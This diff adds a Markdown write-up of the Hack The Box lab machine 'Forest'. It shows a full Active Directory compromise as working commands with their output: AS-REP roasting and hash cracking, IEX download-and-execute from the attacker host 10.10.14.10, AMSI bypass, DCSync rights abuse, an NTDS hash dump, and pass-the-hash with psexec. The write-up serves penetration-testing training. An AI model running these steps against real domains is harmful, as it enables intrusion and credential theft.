@@ -1,0 +1,406 @@
+---
+title: Forest
+banner: /avatars/forest.webp
+difficulty: easy
+os: windows
+releaseDate: 2019-10-12
+pwnDate: 2024-05-31
+slug: "forest"
+achievement: https://www.hackthebox.com/achievement/machine/701907/212
+---
+
+## Enumeration
+
+```bash
+sudo nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn --disable-arp-ping 10.10.10.161 -oG allPorts
+
+PORT      STATE SERVICE          REASON
+88/tcp    open  kerberos-sec     syn-ack ttl 127
+135/tcp   open  msrpc            syn-ack ttl 127
+139/tcp   open  netbios-ssn      syn-ack ttl 127
+389/tcp   open  ldap             syn-ack ttl 127
+445/tcp   open  microsoft-ds     syn-ack ttl 127
+464/tcp   open  kpasswd5         syn-ack ttl 127
+593/tcp   open  http-rpc-epmap   syn-ack ttl 127
+636/tcp   open  ldapssl          syn-ack ttl 127
+3268/tcp  open  globalcatLDAP    syn-ack ttl 127
+3269/tcp  open  globalcatLDAPssl syn-ack ttl 127
+5985/tcp  open  wsman            syn-ack ttl 127
+9389/tcp  open  adws             syn-ack ttl 127
+47001/tcp open  winrm            syn-ack ttl 127
+49664/tcp open  unknown          syn-ack ttl 127
+49665/tcp open  unknown          syn-ack ttl 127
+49666/tcp open  unknown          syn-ack ttl 127
+49667/tcp open  unknown          syn-ack ttl 127
+49671/tcp open  unknown          syn-ack ttl 127
+49676/tcp open  unknown          syn-ack ttl 127
+49677/tcp open  unknown          syn-ack ttl 127
+49682/tcp open  unknown          syn-ack ttl 127
+49701/tcp open  unknown          syn-ack ttl 127
+49940/tcp open  unknown          syn-ack ttl 127
+```
+
+```bash
+sudo nmap -p88,135,139,389,445,464,593,636,3268,3269,5985,9389,47001,49664,49665,49666,49667,49671,49676,49677,49682,49701,49940 -sCV 10.10.10.161 -oN targeted
+
+PORT      STATE SERVICE      VERSION
+88/tcp    open  kerberos-sec Microsoft Windows Kerberos (server time: 2024-05-31 07:41:42Z)
+135/tcp   open  msrpc        Microsoft Windows RPC
+139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
+389/tcp   open  ldap         Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)
+445/tcp   open  microsoft-ds Windows Server 2016 Standard 14393 microsoft-ds (workgroup: HTB)
+464/tcp   open  kpasswd5?
+593/tcp   open  ncacn_http   Microsoft Windows RPC over HTTP 1.0
+636/tcp   open  tcpwrapped
+3268/tcp  open  ldap         Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)
+3269/tcp  open  tcpwrapped
+5985/tcp  open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+|_http-server-header: Microsoft-HTTPAPI/2.0
+|_http-title: Not Found
+9389/tcp  open  mc-nmf       .NET Message Framing
+47001/tcp open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+|_http-server-header: Microsoft-HTTPAPI/2.0
+|_http-title: Not Found
+49664/tcp open  msrpc        Microsoft Windows RPC
+49665/tcp open  msrpc        Microsoft Windows RPC
+49666/tcp open  msrpc        Microsoft Windows RPC
+49667/tcp open  msrpc        Microsoft Windows RPC
+49671/tcp open  msrpc        Microsoft Windows RPC
+49676/tcp open  ncacn_http   Microsoft Windows RPC over HTTP 1.0
+49677/tcp open  msrpc        Microsoft Windows RPC
+49682/tcp open  msrpc        Microsoft Windows RPC
+49701/tcp open  msrpc        Microsoft Windows RPC
+49940/tcp open  msrpc        Microsoft Windows RPC
+Service Info: Host: FOREST; OS: Windows; CPE: cpe:/o:microsoft:windows
+
+Host script results:
+| smb-security-mode: 
+|   account_used: <blank>
+|   authentication_level: user
+|   challenge_response: supported
+|_  message_signing: required
+| smb2-security-mode: 
+|   3:1:1: 
+|_    Message signing enabled and required
+| smb2-time: 
+|   date: 2024-05-31T07:42:33
+|_  start_date: 2024-05-30T18:24:25
+|_clock-skew: mean: 2h26m50s, deviation: 4h02m30s, median: 6m50s
+| smb-os-discovery: 
+|   OS: Windows Server 2016 Standard 14393 (Windows Server 2016 Standard 6.3)
+|   Computer name: FOREST
+|   NetBIOS computer name: FOREST\x00
+|   Domain name: htb.local
+|   Forest name: htb.local
+|   FQDN: FOREST.htb.local
+|_  System time: 2024-05-31T00:42:32-07:00
+```
+
+```bash
+ldapsearch -H ldap://10.10.10.161 -x -b "dc=htb,dc=local" > ldap.ldapsearch
+
+# htb.local
+dn: DC=htb,DC=local
+objectClass: top
+objectClass: domain
+objectClass: domainDNS
+distinguishedName: DC=htb,DC=local
+instanceType: 5
+whenCreated: 20190918174549.0Z
+whenChanged: 20240530182415.0Z
+subRefs: DC=ForestDnsZones,DC=htb,DC=local
+subRefs: DC=DomainDnsZones,DC=htb,DC=local
+subRefs: CN=Configuration,DC=htb,DC=local
+<...SNIP...>
+```
+
+```bash
+python3 windapsearch.py -d htb.local --dc-ip 10.10.10.161 --custom "objectClass=*"
+<...SNIP...>
+[+] Performing custom lookup with filter: "objectClass=*"
+[+]     Found 312 results:
+
+<...SNIP...>
+OU=Service Accounts,DC=htb,DC=local
+CN=svc-alfresco,OU=Service Accounts,DC=htb,DC=local
+OU=Security Groups,DC=htb,DC=local
+<...SNIP...>
+```
+
+## Exploitation
+
+```bash
+python3 GetNPUsers.py htb.local/svc-alfresco -dc-ip 10.10.10.161 -no-pass
+
+Impacket v0.11.0 - Copyright 2023 Fortra
+
+[*] Getting TGT for svc-alfresco
+$krb5asrep$23$svc-alfresco@HTB.LOCAL:3cfc034f6ddce4afc32faf03717f5b1a$ced82a0c2e4a74afb02e2baa0f6e8d0f54ad0979ffa1836cff0f6ae0b3fb225baaee7ee5fbb66cd396a494305770cd7df5b1db3e997e1d10244e40bbf8dd245f0baf89ea870dc5d5de5ddbdbeb39bf8bded839a03abe89b7545138b983cecf1f5da78d806357b9dd24d2d6964add6adfd1aa4e45ddcde0becdd156ce80e72826cffcb6c7e9c081063904d6e7f04b3ccad7dfdb55e7a3323cd3341ac95dfc9d6973632316f7d765983cfd34d288d62fb2046fdf1db8e1d8c2262b381085f5680ae13b5895ef7a57fbf975f461cafa0fbb640ef61f846b1328c790da15988efb6c99e2d83963ee
+```
+
+```bash
+hashcat --identify hash.txt
+The following hash-mode match the structure of your input hash:
+
+      # | Name                                                       | Category
+  ======+============================================================+======================================
+  18200 | Kerberos 5, etype 23, AS-REP                               | Network Protocol
+```
+
+```bash
+hashcat -m 18200 -a 0 -d 1 hash.txt /usr/share/wordlists/rockyou.txt
+```
+
+```bash
+john hash.txt --fork=4 -w=/usr/share/wordlists/rockyou.txt
+
+Using default input encoding: UTF-8
+Loaded 1 password hash (krb5asrep, Kerberos 5 AS-REP etype 17/18/23 [MD4 HMAC-MD5 RC4 / PBKDF2 HMAC-SHA1 AES 256/256 AVX2 8x])
+Node numbers 1-4 of 4 (fork)
+Press 'q' or Ctrl-C to abort, almost any other key for status
+s3rvice          ($krb5asrep$23$svc-alfresco@HTB.LOCAL) 
+```
+
+```bash
+crackmapexec winrm 10.10.10.161 -u 'svc-alfresco' -p 's3rvice' 
+SMB         10.10.10.161    5985   FOREST           [*] Windows 10.0 Build 14393 (name:FOREST) (domain:htb.local)
+HTTP        10.10.10.161    5985   FOREST           [*] http://10.10.10.161:5985/wsman
+WINRM       10.10.10.161    5985   FOREST           [+] htb.local\svc-alfresco:s3rvice (Pwn3d!)
+```
+
+```bash
+evil-winrm -i 10.10.10.161 -u svc-alfresco -p s3rvice
+                                        
+Evil-WinRM shell v3.5
+Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
+Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
+Info: Establishing connection to remote endpoint
+
+*Evil-WinRM* PS C:\Users\svc-alfresco\Documents>whoami
+htb\svc-alfresco
+```
+
+```bash
+*Evil-WinRM* PS C:\Users\svc-alfresco\Desktop> cat user.txt
+2d1743e78e533c0e89fa932787985b41
+```
+
+## Privilege Escalation
+
+---
+
+```bash
+bloodhound-python -d 'htb.local' -u svc-alfresco -p s3rvice -gc forest.htb.local -c all -ns 10.10.10.161
+```
+
+```bash
+wget https://raw.githubusercontent.com/BloodHoundAD/BloodHound/master/Collectors/SharpHound.ps1
+mv SharpHound.ps1 /opt/tools
+```
+
+```bash
+cp SharpHound.ps1 sc.ps1
+python3 -m http.server 80
+```
+
+```bash
+*Evil-WinRM* PS C:\Users\svc-alfresco\Documents> IEX(New-Object Net.WebClient).DownloadString("http://10.10.14.10/sc.ps1")
+*Evil-WinRM* PS C:\Users\svc-alfresco\Documents> dir
+*Evil-WinRM* PS C:\Users\svc-alfresco\Documents> Invoke-BloodHound -CollectionMethods All
+```
+
+---
+
+```bash
+*Evil-WinRM* PS C:\Users\svc-alfresco\Documents> $pass = convertto-securestring 'hector' -AsPlainText -Force
+*Evil-WinRM* PS C:\Users\svc-alfresco\Documents> $pass
+System.Security.SecureString
+*Evil-WinRM* PS C:\Users\svc-alfresco\Documents> $cred = New-Object System.Management.Automation.PSCredential('hector',$pass)
+*Evil-WinRM* PS C:\Users\svc-alfresco\Documents> $cred
+
+UserName                     Password
+--------                     --------
+hector   System.Security.SecureString
+*Evil-WinRM* PS C:\Users\svc-alfresco\Documents> New-PSDrive -Name hector -PSProvider FileSystem -Credential $cred -Root \\10.10.14.10\hector
+```
+
+```bash
+impacket-smbserver hector $(pwd) -smb2support -user hector -password hector
+Impacket v0.12.0.dev1 - Copyright 2023 Fortra
+
+[*] Config file parsed
+[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
+[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
+[*] Config file parsed
+[*] Config file parsed
+[*] Config file parsed
+[*] Incoming connection (10.10.10.161,51800)
+[*] AUTHENTICATE_MESSAGE (\,FOREST)
+[*] Could not authenticate user!
+[*] Closing down connection (10.10.10.161,51800)
+[*] Remaining connections []
+[*] Incoming connection (10.10.10.161,51801)
+[*] AUTHENTICATE_MESSAGE (\,FOREST)
+[*] Could not authenticate user!
+[*] Closing down connection (10.10.10.161,51801)
+[*] Remaining connections []
+[*] Incoming connection (10.10.10.161,51802)
+[*] AUTHENTICATE_MESSAGE (\,FOREST)
+[*] Could not authenticate user!
+[*] Closing down connection (10.10.10.161,51802)
+[*] Remaining connections []
+[*] Incoming connection (10.10.10.161,51803)
+[*] AUTHENTICATE_MESSAGE (\hector,FOREST)
+[*] User FOREST\hector authenticated successfully
+[*] hector:::aaaaaaaaaaaaaaaa:7bd1708dd4192875200f6c90d938d711:0101000000000000800a58cd47b3da016912a5113f91bab500000000010010004e00790049006f006100590059004e00030010004e00790049006f006100590059004e0002001000660044004d006900540043007200410004001000660044004d006900540043007200410007000800800a58cd47b3da01060004000200000008003000300000000000000000000000002000000a34d867e19e87f5af2ebc235d61e60b078313fc311948e6eba2ef931114d21e0a001000000000000000000000000000000000000900200063006900660073002f00310030002e00310030002e00310034002e0031003000000000000000000000000000
+[*] Connecting Share(1:IPC$)
+[*] Connecting Share(2:hector)
+[*] Disconnecting Share(1:IPC$)
+```
+
+```bash
+*Evil-WinRM* PS hector:\> .\SharpHound.exe -c all
+2024-05-31T03:59:45.7957444-07:00|INFORMATION|This version of SharpHound is compatible with the 5.0.0 Release of BloodHound
+2024-05-31T03:59:46.5769836-07:00|INFORMATION|Resolved Collection Methods: Group, LocalAdmin, GPOLocalGroup, Session, LoggedOn, Trusts, ACL, Container, RDP, ObjectProps, DCOM, SPNTargets, PSRemote, UserRights, CARegistry, DCRegistry, CertServices
+2024-05-31T03:59:47.7176726-07:00|INFORMATION|Initializing SharpHound at 3:59 AM on 5/31/2024
+2024-05-31T03:59:48.6707363-07:00|INFORMATION|[CommonLib LDAPUtils]Found usable Domain Controller for htb.local : FOREST.htb.local
+2024-05-31T03:59:49.2176658-07:00|INFORMATION|Flags: Group, LocalAdmin, GPOLocalGroup, Session, LoggedOn, Trusts, ACL, Container, RDP, ObjectProps, DCOM, SPNTargets, PSRemote, UserRights, CARegistry, DCRegistry, CertServices
+2024-05-31T03:59:50.7176200-07:00|INFORMATION|Beginning LDAP search for htb.local
+2024-05-31T03:59:50.7176200-07:00|INFORMATION|Testing ldap connection to htb.local
+2024-05-31T03:59:50.8894834-07:00|INFORMATION|Beginning LDAP search for htb.local Configuration NC
+2024-05-31T04:00:21.7020577-07:00|INFORMATION|Status: 0 objects finished (+0 0)/s -- Using 38 MB RAM
+2024-05-31T04:00:34.8114568-07:00|INFORMATION|Producer has finished, closing LDAP channel
+2024-05-31T04:00:34.8114568-07:00|INFORMATION|LDAP channel closed, waiting for consumers
+2024-05-31T04:00:36.2802044-07:00|WARNING|[CommonLib LDAPUtils]Exception in LDAP loop for (objectclass=*) and HTB.LOCAL
+System.DirectoryServices.Protocols.DirectoryOperationException: The object does not exist.
+   at System.DirectoryServices.Protocols.LdapConnection.ConstructResponse(Int32 messageId, LdapOperation operation, ResultAll resultType, TimeSpan requestTimeOut, Boolean exceptionOnTimeOut)
+   at System.DirectoryServices.Protocols.LdapConnection.SendRequest(DirectoryRequest request, TimeSpan requestTimeout)
+   at SharpHoundCommonLib.LDAPUtils.<QueryLDAP>d__40.MoveNext()
+2024-05-31T04:00:36.2802044-07:00|WARNING|[CommonLib LDAPUtils]Exception in LDAP loop for (objectclass=*) and HTB.LOCAL
+System.DirectoryServices.Protocols.DirectoryOperationException: The object does not exist.
+   at System.DirectoryServices.Protocols.LdapConnection.ConstructResponse(Int32 messageId, LdapOperation operation, ResultAll resultType, TimeSpan requestTimeOut, Boolean exceptionOnTimeOut)
+   at System.DirectoryServices.Protocols.LdapConnection.SendRequest(DirectoryRequest request, TimeSpan requestTimeout)
+   at SharpHoundCommonLib.LDAPUtils.<QueryLDAP>d__40.MoveNext()
+2024-05-31T04:00:36.2958330-07:00|WARNING|[CommonLib LDAPUtils]Exception in LDAP loop for (objectclass=*) and HTB.LOCAL
+System.DirectoryServices.Protocols.DirectoryOperationException: The object does not exist.
+   at System.DirectoryServices.Protocols.LdapConnection.ConstructResponse(Int32 messageId, LdapOperation operation, ResultAll resultType, TimeSpan requestTimeOut, Boolean exceptionOnTimeOut)
+   at System.DirectoryServices.Protocols.LdapConnection.SendRequest(DirectoryRequest request, TimeSpan requestTimeout)
+   at SharpHoundCommonLib.LDAPUtils.<QueryLDAP>d__40.MoveNext()
+2024-05-31T04:00:36.5458325-07:00|ERROR|[CommonLib DCRegProc]Error getting data from registry for FOREST.HTB.LOCAL: SYSTEM\CurrentControlSet\Control\SecurityProviders\Schannel:CertificateMappingMethods
+System.Security.SecurityException: Requested registry access is not allowed.
+   at System.ThrowHelper.ThrowSecurityException(ExceptionResource resource)
+   at Microsoft.Win32.RegistryKey.OpenSubKey(String name, Boolean writable)
+   at SharpHoundCommonLib.SHRegistryKey.GetValue(String subkey, String name)
+   at SharpHoundCommonLib.Helpers.GetRegistryKeyData(String target, String subkey, String subvalue, ILogger log)
+The Zone of the assembly that failed was:
+MyComputer
+2024-05-31T04:00:36.5458325-07:00|ERROR|[CommonLib DCRegProc]Error getting data from registry for FOREST.HTB.LOCAL: SYSTEM\CurrentControlSet\Services\Kdc:StrongCertificateBindingEnforcement
+System.Security.SecurityException: Requested registry access is not allowed.
+   at System.ThrowHelper.ThrowSecurityException(ExceptionResource resource)
+   at Microsoft.Win32.RegistryKey.OpenSubKey(String name, Boolean writable)
+   at SharpHoundCommonLib.SHRegistryKey.GetValue(String subkey, String name)
+   at SharpHoundCommonLib.Helpers.GetRegistryKeyData(String target, String subkey, String subvalue, ILogger log)
+The Zone of the assembly that failed was:
+MyComputer
+2024-05-31T04:00:38.6083338-07:00|INFORMATION|Consumers finished, closing output channel
+2024-05-31T04:00:38.6239637-07:00|INFORMATION|Output channel closed, waiting for output task to complete
+Closing writers
+2024-05-31T04:00:50.0458615-07:00|INFORMATION|Status: 475 objects finished (+475 8.050847)/s -- Using 48 MB RAM
+2024-05-31T04:00:50.0458615-07:00|INFORMATION|Enumeration finished in 00:00:59.3459274
+2024-05-31T04:01:08.5147131-07:00|INFORMATION|Saving cache with stats: 412 ID to type mappings.
+ 412 name to SID mappings.
+ 1 machine sid mappings.
+ 2 sid to domain mappings.
+ 0 global catalog mappings.
+2024-05-31T04:01:10.0771967-07:00|INFORMATION|SharpHound Enumeration Completed at 4:01 AM on 5/31/2024! Happy Graphing!
+```
+
+```bash
+sudo neo4j console
+```
+
+```bash
+./BloodHound --no-sandbox
+```
+
+```bash
+*Evil-WinRM* PS hector:\> net user hector password /add /domain
+The command completed successfully.
+
+*Evil-WinRM* PS hector:\> net group "Exchange Windows Permissions" /add hector
+The command completed successfully.
+
+*Evil-WinRM* PS hector:\> net localgroup "Remote Management Users" /add hector
+The command completed successfully.
+
+*Evil-WinRM* PS hector:\> menu
+[+] Dll-Loader 
+[+] Donut-Loader 
+[+] Invoke-Binary
+[+] Bypass-4MSI
+[+] services
+[+] upload
+[+] download
+[+] menu
+[+] exit
+
+*Evil-WinRM* PS hector:\> Bypass-4MSI
+                                        
+Info: Patching 4MSI, please be patient...
+                                        
+[+] Success!
+```
+
+```bash
+wget https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1
+IEX(New-Object Net.WebClient).DownloadString("http://10.10.14.10/PowerView.ps1")
+```
+
+```bash
+*Evil-WinRM* PS C:\Users\svc-alfresco\Documents> $pass = convertto-securestring 'password' -AsPlainText -Force
+*Evil-WinRM* PS C:\Users\svc-alfresco\Documents> $cred = New-Object System.Management.Automation.PSCredential('htb\hector',$pass)
+*Evil-WinRM* PS C:\Users\svc-alfresco\Documents> Add-DomainObjectAcl -Credential $cred -TargetIdentity "DC=htb,DC=local" -PrincipalIdentity hector -Rights DCSync
+```
+
+```bash
+sudo ./secretsdump.py htb/hector@10.10.10.161
+[sudo] password for kali: 
+Impacket v0.12.0.dev1 - Copyright 2023 Fortra
+
+Password:
+[-] RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied 
+[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
+[*] Using the DRSUAPI method to get NTDS.DIT secrets
+htb.local\Administrator:500:aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d32c72a07ceea6:::
+Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+krbtgt:502:aad3b435b51404eeaad3b435b51404ee:819af826bb148e603acb0f33d17632f8:::
+DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+htb.local\$331000-VK4ADACQNUCA:1123:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+htb.local\SM_2c8eef0a09b545acb:1124:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+```
+
+```bash
+crackmapexec smb 10.10.10.161 -u 'administrator' -H 32693b11e6aa90eb43d32c72a07ceea6 
+SMB         10.10.10.161    445    FOREST           [*] Windows Server 2016 Standard 14393 x64 (name:FOREST) (domain:htb.local) (signing:True) (SMBv1:True)
+SMB         10.10.10.161    445    FOREST           [+] htb.local\administrator:32693b11e6aa90eb43d32c72a07ceea6 (Pwn3d!)
+```
+
+```bash
+sudo ./psexec.py -hashes 32693b11e6aa90eb43d32c72a07ceea6:32693b11e6aa90eb43d32c72a07ceea6 administrator@10.10.10.161
+Impacket v0.12.0.dev1 - Copyright 2023 Fortra
+
+[*] Requesting shares on 10.10.10.161.....
+[*] Found writable share ADMIN$
+[*] Uploading file dsOnHadw.exe
+[*] Opening SVCManager on 10.10.10.161.....
+[*] Creating service TyRo on 10.10.10.161.....
+[*] Starting service TyRo.....
+[!] Press help for extra shell commands
+Microsoft Windows [Version 10.0.14393]
+(c) 2016 Microsoft Corporation. All rights reserved.
+```
+
+```bash
+C:\Users\Administrator\Desktop> type root.txt
+eb58b2d6a6c0bb761d4e271a45d83c6b
+```
